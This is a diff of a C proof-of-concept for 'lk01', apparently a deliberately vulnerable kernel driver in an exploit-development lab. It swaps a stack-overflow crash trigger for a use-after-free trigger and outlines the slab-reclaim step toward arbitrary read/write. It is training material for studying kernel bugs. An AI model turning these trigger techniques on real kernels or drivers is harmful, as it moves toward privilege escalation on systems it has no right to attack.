@@ -1,61 +1,69 @@
 /*
- * lk01_expl — crash-triggering PoC for the lk01 driver's LK01_COPY stack overflow.
+ * lk01_expl - use-after-free demonstrator for the lk01 driver.
  *
- * This is a starting point for a real exploit, NOT a working LPE: it demonstrates the crash
- * (an unchecked copy_from_user smashing a 64-byte kernel stack buffer) and stops there. Build it
- * for the guest arch (see README.md for the cross-compile one-liner) and run it with
- * `start_kgdb --run ./exploit/lk01_expl` against a live session with lk01 loaded
- * (`start_kgdb --insmod ./modules/lk01`).
+ * lk01 is a slot-based object manager (ALLOC/WRITE/READ/FREE). LK01_FREE releases the object but
+ * leaves the slot's pointer dangling, so writing or reading the same slot after a FREE is a
+ * use-after-free. This PoC drives that path: allocate a slot, free it, then write to it again.
+ * On a KASAN kernel (--profile exploit-dev,kasan) the second write raises a use-after-free report;
+ * on a plain kernel it silently corrupts freed memory (debug it with the breakpoints in the
+ * walkthrough). This is a starting point for a real exploit (reclaim the freed slab with a
+ * controlled object, then the dangling slot is an arbitrary read/write), NOT a working LPE.
  */
 
 #include <fcntl.h>
-#include <linux/ioctl.h> /* UAPI-safe: provides the _IOW() macro for userspace */
-#include <stddef.h>
+#include <stdint.h>
 #include <stdio.h>
-#include <stdlib.h>
 #include <string.h>
 #include <sys/ioctl.h>
 #include <unistd.h>
 
-/* Must mirror the kernel-side struct lk01_arg in lk01.c exactly. */
-struct lk01_arg {
-	size_t len;
-	void *ptr;
+/* Must mirror the kernel-side struct lk01_req in lk01.c exactly (same layout and size). */
+struct lk01_req {
+	uint32_t idx;
+	uint32_t len;
+	void *buf;
 };
 
-#define LK01_COPY _IOW('L', 1, struct lk01_arg)
+#define LK01_ALLOC _IOW('L', 1, struct lk01_req)
+#define LK01_FREE _IOW('L', 2, struct lk01_req)
+#define LK01_WRITE _IOW('L', 3, struct lk01_req)
+#define LK01_READ _IOR('L', 4, struct lk01_req)
+
+static int lk01(int fd, unsigned long cmd, unsigned int idx, unsigned int len, void *buf)
+{
+	struct lk01_req r = {.idx = idx, .len = len, .buf = buf};
+
+	return ioctl(fd, cmd, &r);
+}
 
 int main(void)
 {
-	const size_t len = 4096; /* kernel's kbuf[] is only 64 bytes — this overflows it */
-	int fd;
-	char *buf;
-	struct lk01_arg arg;
+	char buf[128];
+	int fd = open("/dev/lk01", O_RDWR);
 
-	printf("[*] opening /dev/lk01\n");
-	fd = open("/dev/lk01", O_RDWR);
 	if (fd < 0) {
-		perror("[!] open");
+		perror("[!] open /dev/lk01");
 		return 1;
 	}
 
-	buf = malloc(len);
-	if (!buf) {
-		perror("[!] malloc");
-		close(fd);
+	printf("[*] ALLOC slot 0 (%zu bytes)\n", sizeof(buf));
+	if (lk01(fd, LK01_ALLOC, 0, sizeof(buf), NULL) < 0) {
+		perror("[!] alloc");
 		return 1;
 	}
-	memset(buf, 0x41, len);
 
-	arg.len = len;
-	arg.ptr = buf;
+	memset(buf, 'A', sizeof(buf));
+	printf("[*] WRITE slot 0 (valid)\n");
+	lk01(fd, LK01_WRITE, 0, sizeof(buf), buf);
 
-	printf("[*] ioctl(LK01_COPY, len=%zu) — overflowing the 64-byte kernel stack buffer\n", len);
-	printf("[*] expecting a kernel panic; if you read this, it didn't crash\n");
-	if (ioctl(fd, LK01_COPY, &arg) < 0)
-		perror("[!] ioctl");
+	printf("[*] FREE slot 0 (the slot pointer is left dangling)\n");
+	lk01(fd, LK01_FREE, 0, 0, NULL);
 
-	free(buf);
+	memset(buf, 'B', sizeof(buf));
+	printf("[*] WRITE slot 0 AGAIN, this is the use-after-free\n");
+	printf("[*] on a KASAN kernel this raises a use-after-free report; if you read past here, it did not fault\n");
+	lk01(fd, LK01_WRITE, 0, sizeof(buf), buf);
+
 	close(fd);
 	return 0;
 }
